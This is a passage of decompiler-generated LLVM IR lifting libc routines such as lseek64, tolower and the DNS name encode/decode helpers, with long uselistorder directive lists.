100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 92, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 88, 306, 307, 308, 309, 4, 314, 23, 24, 315, 25, 89, 90, 93, 316, 91, 26, 27, 317, 318, 319, 320, 28, 5, 29, 30, 321, 31, 362, 363, 364, 365, 366, 367, 368, 369, 387, 388, 389, 145 }
  uselistorder i32* @ebp, { 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 9, 10, 11, 12, 13, 14, 15, 2, 87, 88, 89, 94, 90, 91, 92, 93, 95, 34, 35, 96, 100, 111, 112, 142, 143, 144, 36, 37, 38, 39, 40, 16, 17, 18, 70, 71, 197, 198, 199, 200, 201, 19, 20, 202, 203, 204, 205, 206, 207, 208, 209, 214, 210, 211, 212, 213, 1, 215, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 4, 41, 42, 43, 44, 45, 106, 0, 107, 108, 109, 110, 101, 102, 103, 104, 105, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 62, 6, 7, 8, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 63, 64, 65, 97, 98, 99, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 66, 67, 68, 69, 5, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 180, 181, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 216, 217, 218, 219, 222, 223, 220, 221, 224, 225 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8057951, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8057917, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_80578cd, { 1, 0 }
  uselistorder label %dec_label_pc_80578b1, { 1, 0 }
  uselistorder label %dec_label_pc_8057874, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805783b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057861, { 1, 0 }
  uselistorder label %dec_label_pc_805782f, { 1, 0 }
  uselistorder label %dec_label_pc_8057917.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057801, { 1, 0 }
  uselistorder label %dec_label_pc_80577c6, { 1, 0 }
  uselistorder label %dec_label_pc_805771d, { 1, 0 }
  uselistorder label %dec_label_pc_80576ad, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057962 = load i32, i32* @ebx, align 4
  store i32 %v0_8057962, i32* %stack_var_-12, align 4
  %v2_805796a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805796a, i32* %esi.global-to-local, align 4
  %v1_8057984 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8057984, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_8057984, -4095
  br i1 %tmp16, label %dec_label_pc_805799e, label %dec_label_pc_8057990

dec_label_pc_8057990:                             ; preds = %entry
  %v1_8057990 = call i32 @__errno_location(i32 %arg3)
  %v0_8057995 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057995 = sub i32 0, %v0_8057995
  %v2_8057997 = inttoptr i32 %v1_8057990 to i32*
  store i32 %v1_8057995, i32* %v2_8057997, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80579a2

dec_label_pc_805799e:                             ; preds = %entry
  %v1_805799e = icmp eq i32 %v1_8057984, 0
  br i1 %v1_805799e, label %dec_label_pc_80579a7, label %dec_label_pc_80579a2

dec_label_pc_80579a2:                             ; preds = %dec_label_pc_805799e, %dec_label_pc_8057990
  %v0_80579a2 = phi i32 [ %v1_8057984, %dec_label_pc_805799e ], [ -1, %dec_label_pc_8057990 ]
  %v1_80579a4 = ashr i32 %v0_80579a2, 31
  br label %dec_label_pc_80579af

dec_label_pc_80579a7:                             ; preds = %dec_label_pc_805799e
  %v3_80579a7 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80579af

dec_label_pc_80579af:                             ; preds = %dec_label_pc_80579a2, %dec_label_pc_80579a7
  %v0_80579b5 = phi i32 [ %v0_80579a2, %dec_label_pc_80579a2 ], [ %v3_80579a7, %dec_label_pc_80579a7 ]
  %storemerge = phi i32 [ %v1_80579a4, %dec_label_pc_80579a2 ], [ %tmp, %dec_label_pc_80579a7 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_80579b2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80579b2, i32* @ebx, align 4
  ret i32 %v0_80579b5

; uselistorder directives
  uselistorder i32 %v1_8057984, { 1, 3, 0, 2 }
  uselistorder i32 31, { 21, 16, 22, 28, 29, 23, 24, 12, 3, 4, 1, 2, 11, 27, 17, 18, 19, 7, 8, 5, 6, 13, 9, 10, 25, 26, 20, 14, 15, 0 }
  uselistorder i32 (i32)* @__errno_location, { 62, 50, 41, 40, 39, 49, 48, 61, 60, 47, 25, 44, 59, 58, 18, 52, 24, 71, 13, 12, 11, 10, 9, 38, 8, 23, 22, 7, 21, 42, 54, 64, 63, 37, 36, 35, 70, 20, 19, 53, 17, 43, 57, 56, 55, 2, 46, 45, 14, 51, 6, 5, 69, 32, 31, 68, 29, 4, 16, 3, 28, 15, 67, 66, 34, 27, 26, 65, 1, 0, 72, 33, 30 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80579af, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80579bc = add i32 %arg1, 128
  %v6_80579c7 = icmp ugt i32 %v1_80579bc, 383
  br i1 %v6_80579c7, label %dec_label_pc_80579d2, label %dec_label_pc_80579c9

dec_label_pc_80579c9:                             ; preds = %entry
  %v0_80579c9 = load i32, i32* bitcast (i32** @global_var_805b500.484 to i32*), align 256
  %v2_80579ce = mul i32 %arg1, 2
  %v3_80579ce = add i32 %v0_80579c9, %v2_80579ce
  %v4_80579ce = inttoptr i32 %v3_80579ce to i16*
  %v5_80579ce = load i16, i16* %v4_80579ce, align 2
  %v6_80579ce = sext i16 %v5_80579ce to i32
  store i32 %v6_80579ce, i32* @edx, align 4
  br label %dec_label_pc_80579d2

dec_label_pc_80579d2:                             ; preds = %entry, %dec_label_pc_80579c9
  %v0_80579d2 = phi i32 [ %arg1, %entry ], [ %v6_80579ce, %dec_label_pc_80579c9 ]
  ret i32 %v0_80579d2

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 61, 64, 15, 16, 17, 63, 18, 19, 20, 21, 24, 25, 23, 22, 26, 27, 28, 29, 32, 33, 31, 30, 34, 37, 36, 35, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 52, 53, 54, 50, 55, 51, 57, 56, 58, 60, 59, 62 }
  uselistorder i32 128, { 18, 9, 11, 4, 10, 5, 6, 12, 0, 7, 8, 13, 14, 15, 16, 17, 3, 2, 19, 1 }
  uselistorder label %dec_label_pc_80579d2, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80579d9 = load i32, i32* @edi, align 4
  %v0_80579da = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80579e1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80579e1, i32* @edi, align 4
  %v1_8057a404 = icmp eq i8* %arg1, null
  br i1 %v1_8057a404, label %dec_label_pc_8057a49, label %dec_label_pc_8057a44.lr.ph

dec_label_pc_8057a44.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057a44

dec_label_pc_80579e7:                             ; preds = %dec_label_pc_8057a44
  %v5_80579ec = call i32 @__GI_strchr(i8* %v1_8057a44, i32 46)
  %v1_80579f4 = icmp eq i32 %v5_80579ec, 0
  br i1 %v1_80579f4, label %dec_label_pc_8057a00, label %dec_label_pc_80579fa

dec_label_pc_80579fa:                             ; preds = %dec_label_pc_80579e7
  %v1_80579fc = load i32, i32* @edi, align 4
  %v2_80579fc = sub i32 %v5_80579ec, %v1_80579fc
  br label %dec_label_pc_8057a0e

dec_label_pc_8057a00:                             ; preds = %dec_label_pc_80579e7
  %v0_8057a03 = load i32, i32* @edi, align 4
  %v5_8057a03 = inttoptr i32 %v0_8057a03 to i8*
  %v3_8057a04 = call i32 @strlen(i8* %v5_8057a03)
  br label %dec_label_pc_8057a0e

dec_label_pc_8057a0e:                             ; preds = %dec_label_pc_80579fa, %dec_label_pc_8057a00
  %v0_8057a21 = phi i32 [ %v3_8057a04, %dec_label_pc_8057a00 ], [ %v2_80579fc, %dec_label_pc_80579fa ]
  store i32 %v0_8057a21, i32* @esi, align 4
  %v1_8057a0e = icmp eq i32 %v0_8057a21, 0
  %v3_8057a0e = trunc i32 %v0_8057a21 to i8
  br i1 %v1_8057a0e, label %dec_label_pc_8057a5d, label %dec_label_pc_8057a12

dec_label_pc_8057a12:                             ; preds = %dec_label_pc_8057a0e
  %v1_8057a16 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057a16 = sub i32 %arg3, %v1_8057a16
  %v1_8057a18 = add i32 %v2_8057a16, -1
  %v7_8057a19 = icmp ult i32 %v0_8057a21, %v1_8057a18
  %v1_8057a1b = icmp eq i1 %v7_8057a19, false
  br i1 %v1_8057a1b, label %dec_label_pc_8057a5d, label %dec_label_pc_8057a1d

dec_label_pc_8057a1d:                             ; preds = %dec_label_pc_8057a12
  store i32 %arg2, i32* @edx, align 4
  %v4_8057a23 = add i32 %v1_8057a16, %arg2
  %v5_8057a23 = inttoptr i32 %v4_8057a23 to i8*
  store i8 %v3_8057a0e, i8* %v5_8057a23, align 1
  %v0_8057a26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057a26 = add i32 %v0_8057a26, 1
  %v0_8057a28 = load i32, i32* @edx, align 4
  %v0_8057a2a = load i32, i32* @esi, align 4
  %v2_8057a2b = add i32 %v1_8057a26, %v0_8057a28
  %v0_8057a2d = load i32, i32* @edi, align 4
  %v2_8057a2e = add i32 %v0_8057a2a, %v1_8057a26
  store i32 %v2_8057a2e, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_8057a2b to i16*
  %v7_8057a31 = call i32 @memcpy(i16* %tmp29, i32 %v0_8057a2d, i32 %v0_8057a2a)
  %v1_8057a3d = add i32 %v5_80579ec, 1
  br i1 %v1_80579f4, label %dec_label_pc_8057a49, label %dec_label_pc_8057a40

dec_label_pc_8057a40:                             ; preds = %dec_label_pc_8057a1d
  store i32 %v1_8057a3d, i32* @edi, align 4
  %v1_8057a40 = icmp eq i32 %v1_8057a3d, 0
  br i1 %v1_8057a40, label %dec_label_pc_8057a49, label %dec_label_pc_8057a44

dec_label_pc_8057a44:                             ; preds = %dec_label_pc_8057a44.lr.ph, %dec_label_pc_8057a40
  %v0_80579eb = phi i32 [ %v4_80579e1, %dec_label_pc_8057a44.lr.ph ], [ %v1_8057a3d, %dec_label_pc_8057a40 ]
  %v1_8057a44 = inttoptr i32 %v0_80579eb to i8*
  %v2_8057a44 = load i8, i8* %v1_8057a44, align 1
  %v3_8057a44 = icmp eq i8 %v2_8057a44, 0
  %v1_8057a47 = icmp eq i1 %v3_8057a44, false
  br i1 %v1_8057a47, label %dec_label_pc_80579e7, label %dec_label_pc_8057a49

dec_label_pc_8057a49:                             ; preds = %dec_label_pc_8057a40, %dec_label_pc_8057a44, %dec_label_pc_8057a1d, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_8057a5d, label %dec_label_pc_8057a50

dec_label_pc_8057a50:                             ; preds = %dec_label_pc_8057a49
  %v1_8057a54 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057a54 = add i32 %v1_8057a54, %arg2
  %v3_8057a54 = inttoptr i32 %v2_8057a54 to i8*
  store i8 0, i8* %v3_8057a54, align 1
  %v0_8057a58 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057a58 = add i32 %v0_8057a58, 1
  br label %dec_label_pc_8057a60

dec_label_pc_8057a5d:                             ; preds = %dec_label_pc_8057a12, %dec_label_pc_8057a0e, %dec_label_pc_8057a49
  br label %dec_label_pc_8057a60

dec_label_pc_8057a60:                             ; preds = %dec_label_pc_8057a50, %dec_label_pc_8057a5d
  %storemerge2 = phi i32 [ %v1_8057a58, %dec_label_pc_8057a50 ], [ -1, %dec_label_pc_8057a5d ]
  store i32 %v0_80579da, i32* @esi, align 4
  store i32 %v0_80579d9, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8057a44, { 1, 0 }
  uselistorder i32 %v1_8057a3d, { 0, 2, 1 }
  uselistorder i32 %v0_8057a2a, { 1, 0 }
  uselistorder i32 %v5_80579ec, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 1, 0, 4, 3, 7, 6, 2, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 7, 8, 9, 0, 1, 2, 3, 4, 5, 6, 10, 11 }
  uselistorder i32 46, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12 }
  uselistorder label %dec_label_pc_8057a60, { 1, 0 }
  uselistorder label %dec_label_pc_8057a5d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057a49, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057a44, { 1, 0 }
  uselistorder label %dec_label_pc_8057a0e, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8057a6a = load i32, i32* @esi, align 4
  %v4_8057a6f = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8057a6f, label %dec_label_pc_8057b36, label %dec_label_pc_8057a7e

dec_label_pc_8057a7e:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8057b1e2541 = add i32 %arg2, %arg1
  %v3_8057b1e2642 = inttoptr i32 %v2_8057b1e2541 to i8*
  %v4_8057b1e2743 = load i8, i8* %v3_8057b1e2642, align 1
  %v1_8057b222945 = icmp eq i8 %v4_8057b1e2743, 0
  %v1_8057b243046 = icmp eq i1 %v1_8057b222945, false
  br i1 %v1_8057b243046, label %dec_label_pc_8057a8c.lr.ph, label %dec_label_pc_8057b2a

dec_label_pc_8057a8c:                             ; preds = %dec_label_pc_8057a8c.lr.ph, %dec_label_pc_8057aa5
  %v0_8057a96 = phi i32 [ %v0_8057a96.pre, %dec_label_pc_8057a8c.lr.ph ], [ %v4_8057ab6, %dec_label_pc_8057aa5 ]
  %v8_8057a8c37 = phi i1 [ %v8_8057a8c3151, %dec_label_pc_8057a8c.lr.ph ], [ true, %dec_label_pc_8057aa5 ]
  %v5_8057b1e36.in = phi i8 [ %v5_8057b1e2850.in, %dec_label_pc_8057a8c.lr.ph ], [ %v4_8057b1e, %dec_label_pc_8057aa5 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8057a8c.lr.ph ], [ 0, %dec_label_pc_8057aa5 ]
  %v0_8057a9334 = phi i32 [ %v0_8057a93.ph47, %dec_label_pc_8057a8c.lr.ph ], [ %v2_8057ac4, %dec_label_pc_8057aa5 ]
  %v5_8057b1e36 = zext i8 %v5_8057b1e36.in to i32
  %v1_8057a93 = add i32 %v0_8057a9334, 1
  store i32 %v1_8057a93, i32* @esi, align 4
  %v3_8057a96 = select i1 %v8_8057a8c37, i32 2, i32 1
  %v4_8057a96 = add i32 %v3_8057a96, %v0_8057a96
  store i32 %v4_8057a96, i32* %ebp.global-to-local, align 4
  %v1_8057a99 = and i32 %v5_8057b1e36, 192
  %v6_8057a9e = icmp eq i32 %v1_8057a99, 192
  %v1_8057aa3 = icmp eq i1 %v6_8057a9e, false
  br i1 %v1_8057aa3, label %dec_label_pc_8057ac8, label %dec_label_pc_8057aa5

dec_label_pc_8057aa5:                             ; preds = %dec_label_pc_8057a8c
  %v2_8057ab2 = add i32 %v1_8057a93, %arg1
  %v3_8057ab2 = inttoptr i32 %v2_8057ab2 to i8*
  %v4_8057ab2 = load i8, i8* %v3_8057ab2, align 1
  %v5_8057ab2 = zext i8 %v4_8057ab2 to i32
  %v4_8057ab6 = add i32 %v3_8057a96, %v4_8057a96
  store i32 %v4_8057ab6, i32* %ebp.global-to-local, align 4
  %v1_8057ab9 = mul nuw nsw i32 %v5_8057b1e36, 256
  %v2_8057abc = and i32 %v1_8057ab9, 16128
  %v2_8057ac4 = or i32 %v5_8057ab2, %v2_8057abc
  store i32 %v2_8057ac4, i32* @edx, align 4
  store i32 %v1_8057ae5.ph48, i32* @ecx, align 4
  %v2_8057b1e = add i32 %v2_8057ac4, %arg1
  %v3_8057b1e = inttoptr i32 %v2_8057b1e to i8*
  %v4_8057b1e = load i8, i8* %v3_8057b1e, align 1
  %v1_8057b22 = icmp eq i8 %v4_8057b1e, 0
  %v1_8057b24 = icmp eq i1 %v1_8057b22, false
  br i1 %v1_8057b24, label %dec_label_pc_8057a8c, label %dec_label_pc_8057b2a

dec_label_pc_8057ac8:                             ; preds = %dec_label_pc_8057a8c
  %v2_8057ac8 = add i32 %v5_8057b1e36, %v1_8057ae5.ph48
  %v1_8057acd = add i32 %v2_8057ac8, 1
  store i32 %v1_8057acd, i32* @edi, align 4
  %v10_8057ace = icmp ult i32 %v1_8057acd, %arg4
  %v1_8057ad6 = icmp eq i1 %v10_8057ace, false
  br i1 %v1_8057ad6, label %dec_label_pc_8057b36, label %dec_label_pc_8057ad8

dec_label_pc_8057ad8:                             ; preds = %dec_label_pc_8057ac8
  %v2_8057ade = add i32 %v1_8057a93, %arg1
  %v2_8057ae5 = add i32 %v1_8057ae5.ph48, %arg3
  %v3_8057ae8 = inttoptr i32 %v2_8057ae5 to i16*
  %v4_8057ae8 = call i32 @memcpy(i16* %v3_8057ae8, i32 %v2_8057ade, i32 %v5_8057b1e36)
  %v0_8057af4 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8057afd = load i32, i32* @esi, align 4
  %v2_8057afd = add i32 %v0_8057afd, %v5_8057b1e36
  store i32 %v2_8057afd, i32* @edx, align 4
  %v1_8057b04 = icmp eq i1 %v8_8057a8c37, false
  %v2_8057af4 = select i1 %v1_8057b04, i32 %v5_8057b1e36, i32 0
  %v4_8057b04 = add i32 %v0_8057af4, %v2_8057af4
  store i32 %v4_8057b04, i32* %ebp.global-to-local, align 4
  %v4_8057b15 = add i32 %v2_8057ac8, %arg3
  %v5_8057b15 = inttoptr i32 %v4_8057b15 to i8*
  store i8 46, i8* %v5_8057b15, align 1
  %v0_8057b18.pre = load i32, i32* @edi, align 4
  %v1_8057b1e.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8057b18.pre, i32* @ecx, align 4
  %v2_8057b1e25 = add i32 %v1_8057b1e.pre.pre, %arg1
  %v3_8057b1e26 = inttoptr i32 %v2_8057b1e25 to i8*
  %v4_8057b1e27 = load i8, i8* %v3_8057b1e26, align 1
  %v1_8057b2229 = icmp eq i8 %v4_8057b1e27, 0
  %v1_8057b2430 = icmp eq i1 %v1_8057b2229, false
  %v8_8057a8c31 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8057a96.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_8057b2430, label %dec_label_pc_8057a8c.lr.ph, label %dec_label_pc_8057b2a

dec_label_pc_8057a8c.lr.ph:                       ; preds = %dec_label_pc_8057ad8, %dec_label_pc_8057a7e
  %v0_8057a96.pre = phi i32 [ 0, %dec_label_pc_8057a7e ], [ %v0_8057a96.pre.pre, %dec_label_pc_8057ad8 ]
  %v8_8057a8c3151 = phi i1 [ false, %dec_label_pc_8057a7e ], [ %v8_8057a8c31, %dec_label_pc_8057ad8 ]
  %v5_8057b1e2850.in = phi i8 [ %v4_8057b1e2743, %dec_label_pc_8057a7e ], [ %v4_8057b1e27, %dec_label_pc_8057ad8 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8057a7e ], [ %stack_var_-17.135, %dec_label_pc_8057ad8 ]
  %v1_8057ae5.ph48 = phi i32 [ 0, %dec_label_pc_8057a7e ], [ %v0_8057b18.pre, %dec_label_pc_8057ad8 ]
  %v0_8057a93.ph47 = phi i32 [ %arg2, %dec_label_pc_8057a7e ], [ %v1_8057b1e.pre.pre, %dec_label_pc_8057ad8 ]
  br label %dec_label_pc_8057a8c

dec_label_pc_8057b2a:                             ; preds = %dec_label_pc_8057ad8, %dec_label_pc_8057aa5, %dec_label_pc_8057a7e
  %v0_8057b2f = phi i32 [ 0, %dec_label_pc_8057a7e ], [ %v4_8057ab6, %dec_label_pc_8057aa5 ], [ %v0_8057a96.pre.pre, %dec_label_pc_8057ad8 ]
  %v8_8057a8c.lcssa = phi i1 [ false, %dec_label_pc_8057a7e ], [ true, %dec_label_pc_8057aa5 ], [ %v8_8057a8c31, %dec_label_pc_8057ad8 ]
  %v2_8057b31 = zext i1 %v8_8057a8c.lcssa to i32
  %v3_8057b31 = add i32 %v0_8057b2f, 1
  %v4_8057b31 = add i32 %v3_8057b31, %v2_8057b31
  br label %dec_label_pc_8057b39

dec_label_pc_8057b36:                             ; preds = %dec_label_pc_8057ac8, %entry
  br label %dec_label_pc_8057b39

dec_label_pc_8057b39:                             ; preds = %dec_label_pc_8057b2a, %dec_label_pc_8057b36
  %storemerge = phi i32 [ %v4_8057b31, %dec_label_pc_8057b2a ], [ -1, %dec_label_pc_8057b36 ]
  store i32 %v0_8057a6a, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057ae5.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_8057b1e, { 1, 0 }
  uselistorder i32 %v2_8057ac4, { 0, 2, 1 }
  uselistorder i32 %v4_8057ab6, { 0, 2, 1 }
  uselistorder i32 %v5_8057b1e36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 2, 15, 18, 5, 0, 17, 11, 1, 12, 13, 6, 7, 8, 9, 3, 4, 14, 16, 10 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, {}
  uselistorder i32 256, { 5, 6, 7, 8, 9, 46, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 45, 21, 22, 23, 24, 25, 0, 1, 26, 2, 47, 27, 28, 53, 29, 30, 4, 50, 51, 3, 31, 32, 33, 34, 48, 35, 36, 37, 38, 39, 40, 41, 42, 49, 54, 43, 52, 44 }
  uselistorder i1 true, { 2, 4, 8, 9, 10, 11, 12, 13, 3, 6, 7, 0, 5, 1 }
  uselistorder i32* @edx, { 4, 162, 163, 164, 165, 166, 167, 168, 17, 172, 170, 171, 173, 174, 175, 176, 177, 178, 179, 45, 49, 46, 47, 48, 180, 181, 182, 183, 184, 185, 186, 193, 187, 188, 189, 190, 191, 192, 1, 18, 151, 94, 95, 194, 96, 97, 98, 99, 100, 208, 195, 196, 197, 212, 213, 214, 215, 433, 5, 2, 19, 152, 101, 102, 198, 199, 6, 200, 201, 202, 203, 103, 104, 105, 106, 107, 108, 502, 503, 504, 505, 7, 506, 507, 439, 160, 440, 52, 509, 50, 510, 441, 513, 514, 521, 520, 511, 143, 80, 144, 145, 146, 147, 148, 149, 51, 444, 445, 8, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 9, 459, 460, 442, 443, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 10, 68, 69, 70, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 11, 486, 487, 488, 489, 490, 516, 150, 216, 217, 219, 0, 169, 218, 432, 109, 204, 205, 206, 71, 207, 110, 111, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 16, 129, 130, 112, 131, 12, 132, 133, 135, 13, 136, 137, 138, 139, 140, 44, 14, 134, 512, 209, 210, 211, 15, 141, 434, 435, 508, 161, 515, 431, 517, 501, 72, 436, 437, 73, 428, 438, 74, 518, 519, 75, 76, 77, 78, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 142, 153, 154, 155, 156, 157, 158, 159, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 429, 430, 491, 492, 493, 494, 496, 500, 495, 498, 499, 3, 497, 522 }
  uselistorder i32* @esi, { 241, 242, 243, 244, 245, 246, 35, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 36, 51, 52, 10, 5, 59, 53, 56, 54, 55, 6, 57, 58, 267, 11, 268, 269, 272, 270, 271, 279, 273, 274, 275, 276, 277, 278, 280, 281, 282, 283, 284, 285, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 12, 138, 139, 13, 292, 293, 295, 294, 7, 296, 297, 320, 321, 322, 323, 324, 325, 0, 37, 326, 327, 328, 329, 330, 331, 220, 221, 222, 223, 224, 384, 385, 386, 387, 332, 333, 140, 141, 142, 14, 143, 144, 145, 146, 147, 148, 149, 352, 353, 354, 71, 72, 73, 388, 389, 390, 391, 392, 400, 403, 404, 405, 211, 212, 213, 214, 215, 216, 217, 393, 398, 399, 60, 61, 62, 63, 64, 65, 234, 235, 236, 1, 237, 238, 239, 66, 67, 68, 69, 70, 355, 360, 15, 361, 362, 363, 364, 365, 366, 367, 356, 357, 358, 359, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 16, 379, 38, 380, 381, 382, 383, 334, 335, 336, 339, 340, 341, 342, 343, 344, 345, 346, 347, 406, 17, 407, 408, 150, 18, 151, 39, 32, 337, 338, 350, 351, 218, 219, 415, 416, 152, 153, 154, 155, 156, 157, 158, 308, 19, 8, 298, 302, 303, 304, 305, 20, 33, 306, 307, 299, 300, 301, 89, 21, 90, 91, 309, 22, 310, 311, 159, 160, 161, 162, 24, 163, 2, 165, 166, 167, 168, 23, 169, 170, 164, 171, 172, 173, 174, 3, 175, 176, 177, 178, 179, 180, 181, 34, 25, 182, 183, 26, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 27, 201, 202, 203, 28, 50, 184, 4, 185, 186, 394, 395, 396, 397, 409, 410, 411, 412, 413, 414, 312, 313, 314, 315, 29, 316, 317, 318, 319, 204, 205, 206, 207, 286, 287, 288, 289, 30, 31, 290, 291, 401, 402, 348, 349, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 105, 103, 104, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 9, 120, 121, 122, 123, 124, 125, 